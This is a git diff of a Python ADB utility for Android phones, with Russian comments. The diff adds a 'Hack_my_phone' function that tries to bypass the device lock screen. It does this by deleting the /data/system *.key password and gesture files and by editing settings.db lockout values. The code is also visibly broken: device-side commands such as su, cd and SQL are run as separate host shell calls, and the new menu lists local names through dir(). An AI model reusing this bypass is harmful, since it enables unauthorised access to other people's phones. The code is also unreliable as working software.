@@ -13,13 +13,20 @@ try:
 except:
     logging.error("No keyevents data in /res!")        
 
+def Update():
+    # Получаем список методов внутри текущей среды выполнения Python
+    methods = dir()
 
-slovar = {
-    1: "[1] download_file_from_android",
-    2: "[2] Hack_my_phone",
-    3: "[3] Create_backup",
-    4: "[4] Snif_data"
-}    
+    # Создаем пустой словарь для хранения методов
+    methods_dict = {}
+
+    # Фильтруем методы и добавляем их в словарь
+    for i, method in enumerate(methods):
+        if "__" not in method:
+            methods_dict[i] = method
+    for key, value in methods_dict.items():
+        print(f"{key}: {value}")            
+
 
 def LoggerOn():
     # Настраиваем логгер
@@ -77,15 +84,33 @@ def Create_backup():# Не готоВ!! НУжны опции
 # input keyevent 82 https://xakep.ru/2016/05/12/android-adb/
 
 def Hack_my_phone():
+    """Попытка получить доступ к андроид без пароля"""
     logging.debug('start up Hack_my_phone attempt')
     print(key_events_data["key_events"]["key_wakeup"])
-    subprocess.run(key_events_data["key_events"]["key_wakeup"], shell=True, check=True)
+    subprocess.run(key_events_data["key_events"]["key_wakeup"], shell=True, check=True) # разбудить
+    subprocess.run("adb root", shell=True, check=True)
+    """gesture.key, password.key, cm_gesture.key, personalpattern.key, personalbackuppin.key"""
+
+    try:
+        subprocess.run("adb shell",shell=True, check=True)
+        subprocess.run("su",shell=True, check=True)
+        subprocess.run("cd /data/system",shell=True, check=True)
+        subprocess.run("rm *.key",shell=True, check=True)
+    except:
+        subprocess.run("adb shell",shell=True, check=True)
+        subprocess.run("cd /data/data/com.android.providers.settings/databases",shell=True, check=True)
+        subprocess.run("cd /data/data/com.android.providers.settings/databases",shell=True, check=True)
+        subprocess.run("sqlite3 settings.db",shell=True, check=True)
+        subprocess.run("update system set value=0 where name='lock_pattern_autolock';",shell=True, check=True) 
+        subprocess.run("update system set value=0 where name='lockscreen.lockedoutpermanently';",shell=True, check=True)      
+
     logging.debug('Hack_my_phone finished')
 
 def Main_menu():
     logging.debug('start up Main_menu attempt')
-    print(f"Choose function:\n{slovar[1]};\n{slovar[2]};\n{slovar[3]};\n{slovar[4]}")
-    answer = input()
+    Update()
+    answer = int(input())
+    
     match answer:
         case 1:
             download_file_from_android(FILE_PATH_ON_DEVICE, DESTINATION_PATH_ON_PC)
@@ -100,5 +125,5 @@ def Main_menu():
 if __name__ == "__main__":
     print(START_MESSAGE)
     print("check new version:", GIT_LINK)
-    download_file_from_android(FILE_PATH_ON_DEVICE, DESTINATION_PATH_ON_PC)
+    #download_file_from_android(FILE_PATH_ON_DEVICE, DESTINATION_PATH_ON_PC)
     Main_menu()
